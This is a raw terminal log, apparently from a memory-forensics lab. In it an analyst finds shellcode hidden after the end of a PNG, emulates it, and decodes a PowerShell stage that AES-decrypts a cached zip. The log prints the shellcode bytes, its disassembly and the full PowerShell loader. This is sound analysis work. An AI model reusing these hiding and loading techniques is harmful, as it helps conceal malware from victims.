+file.0xbd8fdbe0a9d0.0xbd8fdbd43990.ImageSectionObject.kernel.appcore.dll.img
+file.0xbd8fdbf02370.0xbd8fdb589240.ImageSectionObject.apphelp.dll.img
+file.0xbd8fdbf2bd10.0xbd8fdbe6b7d0.DataSectionObject.uxtheme.dll.dat
+file.0xbd8fdbf2bd10.0xbd8fdc0cbc80.ImageSectionObject.uxtheme.dll.img
+pid.6260.vad.0x8e0000-0x8e0fff.dmp
+[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mcp file.*review-cover.png* /tmp/cover.png[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccp file.*review-cover.png* /tmp/cover.png
+[?2004lcp: target '/tmp/cover.png': No such file or directory
+[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mcp file.0xbd8fdbcb5a10.0xbd8fdc40d1d0.DataSectionObject.review-cover.png.dat /tmp/cov[27m[7me[27m[7mr.png[27m[A(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ cp file.0xbd8fdbcb5a10.0xbd8fdc40d1d0.DataSectionObject.review-cover.png.dat /tmp/cover.png
+[?2004l[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mcp file.0xbd8fdbcb3c60.0xbd8fdc40ce10.DataSectionObject.review-cache.dat.dat /tmp/cac[27m[7mh[27m[7me.dat[27m[A(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ cp file.0xbd8fdbcb3c60.0xbd8fdc40ce10.DataSectionObject.review-cache.dat.dat /tmp/cache.dat
+[?2004l[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mcp file.0xbd8fdbcb5a10.0xbd8fdc164400.SharedCacheMap.review-cover.png.vacb /tmp/cover[27m[7m.[27m[7mvacb[27m[A(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ cp file.0xbd8fdbcb5a10.0xbd8fdc164400.SharedCacheMap.review-cover.png.vacb /tmp/cover.vacb
+[?2004l[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mfile /tmp/cover.png /tmp/cache.dat[27mfile /tmp/cover.png /tmp/cache.dat
+[?2004l/tmp/cover.png: PNG image data, 1000 x 620, 8-bit/color RGB, non-interlaced
+/tmp/cache.dat: data
+[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mxxd /tmp/cover.png | head -5[27mxxd /tmp/cover.png | head -5
+[?2004l00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
+00000010: 0000 03e8 0000 026c 0802 0000 00e1 971e  .......l........
+00000020: c900 0070 6449 4441 5478 9ced dd07 5414  ...pdIDATx....T.
+00000030: 57df c7f1 5996 8e74 b037 c48a 1d15 4441  W...Y..t.7....DA
+00000040: 11ec 628d bd77 a346 8dc9 9b98 187d 4c62  ..b..w.F.....}Lb
+[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mpython3 - <<'EOF'[27m
+[7mimport struct[27m
+[7md = open('/tmp/cover.png','rb').read()[27m
+[7mprint("total size:", len(d), "magic ok:", d[:8]==b'\x89PNG\r\n\x1a\n')[27m
+[7mp = 8[27m
+[7mwhile p+8 <= len(d):[27m
+[7m    ln, typ = struct.unpack('>I4s', d[p:p+8])[27m
+[7m    print(hex(p), typ, ln)[27m
+[7m    p += 12 + ln[27m
+[7m    if typ == b'IEND': break[27m
+[7mprint("trailing bytes after IEND:", len(d)-p)[27m
+[7mprint(d[p:p+64].hex())[27m
+[7mEOF[27m[A[A[A[A[A[A[A[A[A[A[A[A(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ python3 - <<'EOF'
+import struct
+d = open('/tmp/cover.png','rb').read()
+print("total size:", len(d), "magic ok:", d[:8]==b'\x89PNG\r\n\x1a\n')
+p = 8
+while p+8 <= len(d):
+    ln, typ = struct.unpack('>I4s', d[p:p+8])
+    print(hex(p), typ, ln)
+    p += 12 + ln
+    if typ == b'IEND': break
+print("trailing bytes after IEND:", len(d)-p)
+print(d[p:p+64].hex())
+EOF
+[?2004ltotal size: 32768 magic ok: True
+0x8 b'IHDR' 13
+0x21 b'IDAT' 28772
+0x7091 b'IEND' 0
+trailing bytes after IEND: 3939
+5589e583ec1831f6566a63666878656857696e458965fc648b5e308b5b0c8b5b148b1b8b1b8b5b10895df88b433c01d88b407801d88b482401d9894df431c941
+[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mxxd -p /tmp/cover.png | tr -d '\n' | grep -o "5589e583ec1831f6" | head[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cxxd -p /tmp/cover.png | tr -d '\n' | grep -o "5589e583ec1831f6" | head
+[?2004l5589e583ec1831f6
+[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mstrings -n 8 /tmp/cover.png | head -30[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cstrings -n 8 /tmp/cover.png | head -30
+[?2004lm<_kOQx%
+"?>v<41)
+TORR5?jRf!
+-^idd(_#[h]
+=&6> 0D__
+PORR$IJIM
+_y5s551>p((
+R%s(t662
+$%'[[Z4qq
+B4edd8vx
+bfjbia~L+
++k7bddhkc
+O%$&9V*?fh
+'y7ba^LN
+VjcfhxehWinE
+hfb%%hvfpvhf
+flhrf~vhf
+flhzfvvhgUflhnf
+fxvhf\fkh~fpvhf
+fqvhgUflhYf
+flhYfyfhg
+fofhfWfhh
+hglflhnf
+fmhnf~vhgzfmh
+hgjflhvf
+vhgifmhjfq
+flhvfuvhf
+hfXfhhrfz
+fzfhf^fhhYf
+flhYfzfhg
+[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mbinwalk /tmp/cover.png[27mbinwalk /tmp/cover.png
+[?2004lCommand 'binwalk' not found, but can be installed with:
+sudo apt install binwalk
+[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mpython3 - <<'EOF'[27m
+[7md = open('/tmp/cover.png','rb').read()[27m
+[7mi = d.rfind(b'IEND')[27m
+[7msc = d[i+8:]            # skip 'IEND' + 4-byte CRC[27m
+[7mopen('/tmp/payload.bin','wb').write(sc)[27m
+[7mprint(len(sc), sc[:8].hex())[27m
+[7mEOF[27m[A[A[A[A[A[A(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ python3 - <<'EOF'
+d = open('/tmp/cover.png','rb').read()
+i = d.rfind(b'IEND')
+sc = d[i+8:]            # skip 'IEND' + 4-byte CRC
+open('/tmp/payload.bin','wb').write(sc)
+print(len(sc), sc[:8].hex())
+EOF
+[?2004l3939 5589e583ec1831f6
+[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mstrings -n 4 /tmp/payload.bin[27mstrings -n 4 /tmp/payload.bin
+[?2004lVjcfhxehWinE
+hfb%%hvfpvhf
+fqfhg
+flhrf~vhf
+flhzf
+flhzf
+fhhvf
+vhgZfmh
+flhzfvvhgUflhnf
+vhg}fmh
+flhYfw
+hgufhh
+fxvhf\fkh~fpvhf
+fqvhgUflhYf
+flhYfyfhg
+fofhfWfhh
+frvhg
+fofhg
+fhh]f~
+hglflhnf
+fmhrf
+fmhnf~vhgzfmh
+fhh]f
+hgUflh
+fmhzf~
+hgjflhvf
+fmhnf
+vhgifmhjfq
+flhvfuvhf
+hfXfhhrfz
+hgqfjh
+fzfhf^fhhYf
+flhvf
+flhYfzfhg
+fofhf
+fihnfv
+hgifjhUfo
+fih]f
+fhgsflhjfq
+flhUft
+hfVfkhYfrvhf
+frfhg
+fkhUfofhg|fihYfxvhg
+fofhg
+fihUfofhgZfih
+fjhvf~vhf\fhh
+fpvhg
+fhhjf
+flhrf
+hf[fjhUft
+fkhjf
+flhnf~vhg
+fmhvf
+fmhnf
+vhgifmh
+hgUfmhnf
+vhgVfmhzf~
+hgyflhUf|
+fofhf
+fihvfo
+fmhYf
+fhhrf
+flhUf~
+hgXfhh
+vhgWflhnf
+fmhrfpfhg
+fhghfmh
+fhggflhjf
+hf[fihzf}vhg
+flh~f
+fjhnfuvhf
+fuvhg
+hfYfjh
+fkhrfwvhgZflh
+fhh]fw
+hggfih
+fihvfrfhgsfmhvfyvhgofih]fz
+fhhnf
+fmh~f
+hglfjh~f|fhf
+fpfhg
+flhnf
+vhgUfmhvfz
+hfWfihrf
+fmhUfv
+flh~f
+hf[fjhUft
+hgUfkhzf
+hgWflh]f
+hgiflhUf|
+Eofh
+ERjh
+[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mobjdump -D -b binary -m i386 -M intel /tmp/payload.bin > /tmp/payload.asm[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cobjdump -D -b binary -m i386 -M intel /tmp/payload.bin > /tmp/payload.asm
+[?2004l[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mgrep -n "call" /tmp/payload.asm[27mgrep -n "call" /tmp/payload.asm
+[?2004l[32m[K309[m[K[36m[K:[m[K 53b:	ff d0                	[01;31m[Kcall[m[K   eax
+[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7msed -n 1,120p /tmp/payload.asm[27msed -n 1,120p /tmp/payload.asm
+[?2004l
+/tmp/payload.bin:     file format binary
+
+
+Disassembly of section .data:
+
+00000000 <.data>:
+   0:	55                   	push   ebp
+   1:	89 e5                	mov    ebp,esp
+   3:	83 ec 18             	sub    esp,0x18
+   6:	31 f6                	xor    esi,esi
+   8:	56                   	push   esi
+   9:	6a 63                	push   0x63
+   b:	66 68 78 65          	pushw  0x6578
+   f:	68 57 69 6e 45       	push   0x456e6957
+  14:	89 65 fc             	mov    DWORD PTR [ebp-0x4],esp
+  17:	64 8b 5e 30          	mov    ebx,DWORD PTR fs:[esi+0x30]
+  1b:	8b 5b 0c             	mov    ebx,DWORD PTR [ebx+0xc]
+  1e:	8b 5b 14             	mov    ebx,DWORD PTR [ebx+0x14]
+  21:	8b 1b                	mov    ebx,DWORD PTR [ebx]
+  23:	8b 1b                	mov    ebx,DWORD PTR [ebx]
+  25:	8b 5b 10             	mov    ebx,DWORD PTR [ebx+0x10]
+  28:	89 5d f8             	mov    DWORD PTR [ebp-0x8],ebx
+  2b:	8b 43 3c             	mov    eax,DWORD PTR [ebx+0x3c]
+  2e:	01 d8                	add    eax,ebx
+  30:	8b 40 78             	mov    eax,DWORD PTR [eax+0x78]
+  33:	01 d8                	add    eax,ebx
+  35:	8b 48 24             	mov    ecx,DWORD PTR [eax+0x24]
+  38:	01 d9                	add    ecx,ebx
+  3a:	89 4d f4             	mov    DWORD PTR [ebp-0xc],ecx
+  3d:	31 c9                	xor    ecx,ecx
+  3f:	41                   	inc    ecx
+  40:	c1 e1 05             	shl    ecx,0x5
+  43:	8b 3c 08             	mov    edi,DWORD PTR [eax+ecx*1]
+  46:	01 df                	add    edi,ebx
+  48:	89 7d f0             	mov    DWORD PTR [ebp-0x10],edi
+  4b:	8b 50 1c             	mov    edx,DWORD PTR [eax+0x1c]
+  4e:	01 da                	add    edx,ebx
+  50:	89 55 ec             	mov    DWORD PTR [ebp-0x14],edx
+  53:	8b 58 14             	mov    ebx,DWORD PTR [eax+0x14]
+  56:	31 c0                	xor    eax,eax
+  58:	8b 55 f8             	mov    edx,DWORD PTR [ebp-0x8]
+  5b:	8b 7d f0             	mov    edi,DWORD PTR [ebp-0x10]
+  5e:	8b 75 fc             	mov    esi,DWORD PTR [ebp-0x4]
+  61:	31 c9                	xor    ecx,ecx
+  63:	fc                   	cld
+  64:	8b 3c 87             	mov    edi,DWORD PTR [edi+eax*4]
+  67:	01 d7                	add    edi,edx
+  69:	66 83 c1 08          	add    cx,0x8
+  6d:	f3 a6                	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
+  6f:	74 06                	je     0x77
+  71:	40                   	inc    eax
+  72:	39 d8                	cmp    eax,ebx
+  74:	72 e5                	jb     0x5b
+  76:	c3                   	ret
+  77:	8b 4d f4             	mov    ecx,DWORD PTR [ebp-0xc]
+  7a:	89 d3                	mov    ebx,edx
+  7c:	8b 55 ec             	mov    edx,DWORD PTR [ebp-0x14]
+  7f:	66 8b 04 41          	mov    ax,WORD PTR [ecx+eax*2]
+  83:	8b 04 82             	mov    eax,DWORD PTR [edx+eax*4]
+  86:	01 d8                	add    eax,ebx
+  88:	31 c9                	xor    ecx,ecx
+  8a:	51                   	push   ecx
+  8b:	89 e1                	mov    ecx,esp
+  8d:	68 66 62 25 25       	push   0x25256266
+  92:	68 76 66 70 76       	push   0x76706676
+  97:	68 66 90 66 6c       	push   0x6c669066
+  9c:	68 88 66 71 66       	push   0x66716688
+  a1:	68 67 9c 66 68       	push   0x68669c67
+  a6:	68 94 66 86 76       	push   0x76866694
+  ab:	68 66 9a 66 6d       	push   0x6d669a66
+  b0:	68 8c 66 7f 76       	push   0x767f668c
+  b5:	68 67 8f 66 6c       	push   0x6c668f67
+  ba:	68 72 66 7e 76       	push   0x767e6672
+  bf:	68 66 99 66 6c       	push   0x6c669966
+  c4:	68 7a 66 89 9c       	push   0x9c89667a
+  c9:	68 67 95 66 6c       	push   0x6c669567
+  ce:	68 7a 66 89 8c       	push   0x8c89667a
+  d3:	68 67 9e 66 6c       	push   0x6c669e67
+  d8:	68 8c 66 6f 9c       	push   0x9c6f668c
+  dd:	68 67 9f 66 68       	push   0x68669f67
+  e2:	68 76 66 7f 76       	push   0x767f6676
+  e7:	68 67 5a 66 6d       	push   0x6d665a67
+  ec:	68 9c 66 76 8c       	push   0x8c76669c
+  f1:	68 67 98 66 6c       	push   0x6c669867
+  f6:	68 7a 66 76 76       	push   0x7676667a
+  fb:	68 67 55 66 6c       	push   0x6c665567
+ 100:	68 6e 66 86 76       	push   0x7686666e
+ 105:	68 67 7d 66 6d       	push   0x6d667d67
+ 10a:	68 94 66 74 8c       	push   0x8c746694
+ 10f:	68 67 89 66 69       	push   0x69668967
+ 114:	68 9c 66 7f 76       	push   0x767f669c
+ 119:	68 67 95 66 6c       	push   0x6c669567
+ 11e:	68 59 66 77 8c       	push   0x8c776659
+ 123:	68 67 75 66 68       	push   0x68667567
+ 128:	68 98 66 78 76       	push   0x76786698
+ 12d:	68 66 5c 66 6b       	push   0x6b665c66
+ 132:	68 7e 66 70 76       	push   0x7670667e
+ 137:	68 66 9d 66 69       	push   0x69669d66
+ 13c:	68 8c 66 71 76       	push   0x7671668c
+ 141:	68 67 55 66 6c       	push   0x6c665567
+ 146:	68 59 66 7f 9c       	push   0x9c7f6659
+ 14b:	68 67 91 66 6c       	push   0x6c669167
+ 150:	68 59 66 79 66       	push   0x66796659
+ 155:	68 67 8e 66 68       	push   0x68668e67
+ 15a:	68 9c 66 6f 66       	push   0x666f669c
+ 15f:	68 66 57 66 68       	push   0x68665766
+ 164:	68 9c 66 72 76       	push   0x7672669c
+ 169:	68 67 8e 66 68       	push   0x68668e67
+ 16e:	68 8c 66 6f 66       	push   0x666f668c
+ 173:	68 67 97 66 68       	push   0x68669767
+ 178:	68 5d 66 7e 9c       	push   0x9c7e665d
+ 17d:	68 67 98 66 6c       	push   0x6c669867
+ 182:	68 9c 66 76 8c       	push   0x8c76669c
+ 187:	68 67 8d 66 6c       	push   0x6c668d67
+ 18c:	68 90 66 87 8c       	push   0x8c876690
+ 191:	68 67 6c 66 6c       	push   0x6c666c67
+ 196:	68 6e 66 87 76       	push   0x7687666e
+ 19b:	68 67 9b 66 6d       	push   0x6d669b67
+ 1a0:	68 72 66 7f 8c       	push   0x8c7f6672
+[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mls ~/Desktop/artifacts/tools/emulation[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls ~/Desktop/artifacts/tools/emulation
+[?2004lconfig.json  [0m[01;34mdecoys-x86[0m
+[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mspeakeasy -t /tmp/payload.bin -r -a x86 -o /tmp/report.json 2>&1 | tail -40[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cspeakeasy -t /tmp/payload.bin -r -a x86 -o /tmp/report.json 2>&1 | tail -40
+[?2004l/home/ubuntu/Desktop/artifacts/tools/venv/lib/python3.12/site-packages/unicorn/unicorn.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  import pkg_resources
+* exec: shellcode
+0x153d: 'kernel32.WinExec("powershell.exe -NoProfile -EncodedCommand JABrAD0AWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAGYAWABGAEsAYwBtAGYAbwBpAHIAdwBhAC8AUwBJADQATQBNAHQAMAAxADgAaABBADkAbgBmAC8ARgBsACsAKwB5AGMARQAwAFcAVgA4AEcAKwBxAGcAPQAnACkAOwAkAGIAPQBbAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAnAHIAZQB2AGkAZQB3AC0AYwBhAGMAaABlAC4AZABhAHQAJwApADsAJABhAD0AWwBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAEEAZQBzAF0AOgA6AEMAcgBlAGEAdABlACgAKQA7ACQAYQAuAEsAZQB5AD0AJABrADsAJABhAC4ASQBWAD0AJABiAFsAMAAuAC4AMQA1AF0AOwAkAGEALgBNAG8AZABlAD0AJwBDAEIAQwAnADsAJABhAC4AUABhAGQAZABpAG4AZwA9ACcAUABLAEMAUwA3ACcAOwAkAGQAPQAkAGEALgBDAHIAZQBhAHQAZQBEAGUAYwByAHkAcAB0AG8AcgAoACkALgBUAHIAYQBuAHMAZgBvAHIAbQBGAGkAbgBhAGwAQgBsAG8AYwBrACgAJABiACwAMQA2ACwAJABiAC4ATABlAG4AZwB0AGgALQAxADYAKQA7AFsASQBPAC4ARgBpAGwAZQBdADoAOgBXAHIAaQB0AGUAQQBsAGwAQgB5AHQAZQBzACgAJwByAGUAdgBpAGUAdwAtAGMAYQBjAGgAZQAuAHoAaQBwACcALAAkAGQAKQA=", 0x5)' -> 0x20
+* Finished emulating
+* Saving emulation report to /tmp/report.json
+[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mpython3 - <<'EOF'[27m
+[7mimport base64, json, re[27m
+[7m# pull the base64 from the Speakeasy report; fall back to pasting it by hand[27m
+[7mtxt = open('/tmp/report.json').read()[27m
+[7mm = re.search(r'-EncodedCommand ([A-Za-z0-9+/=]+)', txt)[27m
+[7mb = m.group(1)[27m
+[7ms = base64.b64decode(b).decode('utf-16le')[27m
+[7mprint(s)[27m
+[7mopen('/tmp/stage2.ps1','w').write(s)[27m
+[7mEOF[27m[A[A[A[A[A[A[A[A[A(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ python3 - <<'EOF'
+import base64, json, re
+# pull the base64 from the Speakeasy report; fall back to pasting it by hand
+txt = open('/tmp/report.json').read()
+m = re.search(r'-EncodedCommand ([A-Za-z0-9+/=]+)', txt)
+b = m.group(1)
+s = base64.b64decode(b).decode('utf-16le')
+print(s)
+open('/tmp/stage2.ps1','w').write(s)
+EOF
+[?2004l$k=[Convert]::FromBase64String('fXFKcmfoirwa/SI4MMt018hA9nf/Fl++ycE0WV8G+qg=');$b=[IO.File]::ReadAllBytes('review-cache.dat');$a=[Security.Cryptography.Aes]::Create();$a.Key=$k;$a.IV=$b[0..15];$a.Mode='CBC';$a.Padding='PKCS7';$d=$a.CreateDecryptor().TransformFinalBlock($b,16,$b.Length-16);[IO.File]::WriteAllBytes('review-cache.zip',$d)
+[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mcat /tmp/stage2.ps1[27mcat /tmp/stage2.ps1
+[?2004l$k=[Convert]::FromBase64String('fXFKcmfoirwa/SI4MMt018hA9nf/Fl++ycE0WV8G+qg=');$b=[IO.File]::ReadAllBytes('review-cache.dat');$a=[Security.Cryptography.Aes]::Create();$a.Key=$k;$a.IV=$b[0..15];$a.Mode='CBC';$a.Padding='PKCS7';$d=$a.CreateDecryptor().TransformFinalBlock($b,16,$b.Length-16);[IO.File]::WriteAllBytes('review-cache.zip',$d)[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mpython3 -c "[27m
+[7mimport base64[27m
+[7mk = base64.b64decode('fXFKcmfoirwa/SI4MMt018hA9nf/Fl++ycE0WV8G+qg=')[27m
+[7mprint(len(k), k.hex())[27m
+[7m"[27m[A[A[A[A(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ python3 -c "
+import base64
+k = base64.b64decode('fXFKcmfoirwa/SI4MMt018hA9nf/Fl++ycE0WV8G+qg=')
+print(len(k), k.hex())
+"
+[?2004l32 7d714a7267e88abc1afd223830cb74d7c840f677ff165fbec9c134595f06faa8
+[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mls -la /tmp/cache.dat /tmp/out/*review-cache*[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls -la /tmp/cache.dat /tmp/out/*review-cache*
+[?2004l-rw------- 1 ubuntu ubuntu   4096 Oct 22 23:18 /tmp/cache.dat
+-rw------- 1 ubuntu ubuntu 262144 Oct 22 23:16 /tmp/out/file.0xbd8fdbcb3c60.0xbd8fdc2f6d40.SharedCacheMap.review-cache.dat-1.vacb
+-rw------- 1 ubuntu ubuntu 262144 Oct 22 23:15 /tmp/out/file.0xbd8fdbcb3c60.0xbd8fdc2f6d40.SharedCacheMap.review-cache.dat.vacb
+-rw------- 1 ubuntu ubuntu   4096 Oct 22 23:16 /tmp/out/file.0xbd8fdbcb3c60.0xbd8fdc40ce10.DataSectionObject.review-cache.dat-1.dat
+-rw------- 1 ubuntu ubuntu   4096 Oct 22 23:15 /tmp/out/file.0xbd8fdbcb3c60.0xbd8fdc40ce10.DataSectionObject.review-cache.dat.dat
+[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mxxd /tmp/cache.dat | head -5[27mxxd /tmp/cache.dat | head -5
+[?2004l00000000: d513 b076 f922 56c5 0d3b 3eca ca82 d0c8  ...v."V..;>.....
+00000010: 5358 77c7 3bec f04b 6edb 57a5 70c1 f2c3  SXw.;..Kn.W.p...
+00000020: 3aac e2a8 7bdf 1138 f510 dde6 4500 7ace  :...{..8....E.z.
+00000030: 6e7c b4f9 1c8b 963e a25a a60b b842 c36e  n|.....>.Z...B.n
+00000040: af3b e284 d41a e3cd 20e1 aa36 3e78 e798  .;...... ..6>x..
+[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mpython3 - <<'EOF'[27m
+[7mimport base64, glob[27m
+[7mfrom Crypto.Cipher import AES   # if missing: pip install pycryptodome --break-system-packages[27m
+[7mkey = base64.b64decode('fXFKcmfoirwa/SI4MMt018hA9nf/Fl++ycE0WV8G+qg=')[27m
+[7mfor f in ['/tmp/cache.dat'] + glob.glob('/tmp/out/*review-cache*'):[27m
+[7m    b = open(f,'rb').read()[27m
+[7m    print(f, len(b))[27m
+[7m    for n in (len(b), len(b.rstrip(b'\x00'))):[27m
+[7m        ct = b[16:n][27m
+[7m        ct = ct[:len(ct)//16*16][27m
+[7m        pt = AES.new(key, AES.MODE_CBC, b[:16]).decrypt(ct)[27m
+[7m        print("  trim", n, "starts:", pt[:4], pt[:16].hex())[27m
+[7m        if pt[:2] == b'PK':[27m
+[7m            open('/tmp/review-cache.zip','wb').write(pt)[27m
+[7m            print("  -> wrote /tmp/review-cache.zip")[27m
+[7mEOF[27m[A[A[A[A[A[A[A[A[A[A[A[A[A[A[A(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ python3 - <<'EOF'
+import base64, glob
+from Crypto.Cipher import AES   # if missing: pip install pycryptodome --break-system-packages
+key = base64.b64decode('fXFKcmfoirwa/SI4MMt018hA9nf/Fl++ycE0WV8G+qg=')
+for f in ['/tmp/cache.dat'] + glob.glob('/tmp/out/*review-cache*'):
+    b = open(f,'rb').read()
+    print(f, len(b))
+    for n in (len(b), len(b.rstrip(b'\x00'))):
+        ct = b[16:n]
+        ct = ct[:len(ct)//16*16]
+        pt = AES.new(key, AES.MODE_CBC, b[:16]).decrypt(ct)
+        print("  trim", n, "starts:", pt[:4], pt[:16].hex())
+        if pt[:2] == b'PK':
+            open('/tmp/review-cache.zip','wb').write(pt)
+            print("  -> wrote /tmp/review-cache.zip")
+EOF
+[?2004l/tmp/cache.dat 4096
+  trim 4096 starts: b'PK\x03\x04' 504b030414000000080035bc445dbb96
+  -> wrote /tmp/review-cache.zip
+  trim 528 starts: b'PK\x03\x04' 504b030414000000080035bc445dbb96
+  -> wrote /tmp/review-cache.zip
+/tmp/out/file.0xbd8fdbcb3c60.0xbd8fdc2f6d40.SharedCacheMap.review-cache.dat-1.vacb 262144
+  trim 262144 starts: b'PK\x03\x04' 504b030414000000080035bc445dbb96
+  -> wrote /tmp/review-cache.zip
+  trim 528 starts: b'PK\x03\x04' 504b030414000000080035bc445dbb96
+  -> wrote /tmp/review-cache.zip
+/tmp/out/file.0xbd8fdbcb3c60.0xbd8fdc40ce10.DataSectionObject.review-cache.dat.dat 4096
+  trim 4096 starts: b'PK\x03\x04' 504b030414000000080035bc445dbb96
+  -> wrote /tmp/review-cache.zip
+  trim 528 starts: b'PK\x03\x04' 504b030414000000080035bc445dbb96
+  -> wrote /tmp/review-cache.zip
+/tmp/out/file.0xbd8fdbcb3c60.0xbd8fdc2f6d40.SharedCacheMap.review-cache.dat.vacb 262144
+  trim 262144 starts: b'PK\x03\x04' 504b030414000000080035bc445dbb96
+  -> wrote /tmp/review-cache.zip
+  trim 528 starts: b'PK\x03\x04' 504b030414000000080035bc445dbb96
+  -> wrote /tmp/review-cache.zip
+/tmp/out/file.0xbd8fdbcb3c60.0xbd8fdc40ce10.DataSectionObject.review-cache.dat-1.dat 4096
+  trim 4096 starts: b'PK\x03\x04' 504b030414000000080035bc445dbb96
+  -> wrote /tmp/review-cache.zip
+  trim 528 starts: b'PK\x03\x04' 504b030414000000080035bc445dbb96
+  -> wrote /tmp/review-cache.zip
+[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7munzip -o /tmp/review-cache.zip -d /tmp/cache_out[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cunzip -o /tmp/review-cache.zip -d /tmp/cache_out
+[?2004lArchive:  /tmp/review-cache.zip
+  inflating: /tmp/cache_out/release/approval.txt  
+  inflating: /tmp/cache_out/release/contacts.csv  
+[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mcat /tmp/cache_out/*[27mcat /tmp/cache_out/*
+[?2004lcat: /tmp/cache_out/release: Is a directory
+[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ [7mcat /tmp/cache_out/release/approval.txt[27m
+[7mecho ----[27m
